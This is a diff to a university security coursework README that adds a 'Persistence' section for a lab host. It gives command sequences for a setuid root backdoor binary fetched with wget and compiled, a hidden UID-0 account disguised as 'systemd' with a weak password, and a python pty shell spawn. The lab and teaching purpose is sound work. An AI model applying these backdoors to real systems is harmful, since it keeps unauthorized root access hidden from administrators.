@@ -119,9 +119,45 @@ https://github.com/CptGibbon/CVE-2021-3156
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
 
 ### Persistence
-```
-lorem ipsum
-```
+
+#### Persistence using Suid Binary
+- After gaining root access via privilege escalation, create suid binary to allow anyone to execute the file.
+- Allows attacker to regain root privileges from low privileged user account.
+    setup
+    ```
+    root@confluence:/# cd /tmp
+    root@confluence:/tmp# wget "https://raw.githubusercontent.com/kevinnivekkevin/3204_coursework_1/main/attack/Persistence binarysuid?token=GHSAT0AAAAAABZGUXA66OLI56PBA7NBDXSYY2U5H6A" -O /tmp/suid.c
+    ...
+    ...
+    root@confluence:/tmp# gcc suid.c -o suid
+    root@confluence:/tmp# chmod 7111 suid
+    root@confluence:/tmp# rm suid.c
+    ```
+    Regain
+    ```
+    confluence@confluence:/tmp$ ./suid
+    whoami
+    root
+    ```
+#### Persistence using account
+- After gaining root access via privilege escalation, create root privileges account.
+- Allows attacker to regain root privileges by accessing the account.
+    ```
+    root@confluence:/tmp# useradd -ou 0 -g 0 systemd
+    root@confluence:/tmp# chpasswd <<<"systemd:systemd"
+    ```
+    Regain
+    ```
+    confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
+    confluence@confluence:/tmp$ python /tmp/shell.py
+    bash: /root/.bashrc: Permission denied
+    confluence@confluence:/tmp$ su systemd
+    Password: systemd
+    # whoami
+    whoami
+    root
+    ```
+
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
 
 ### Credential Access
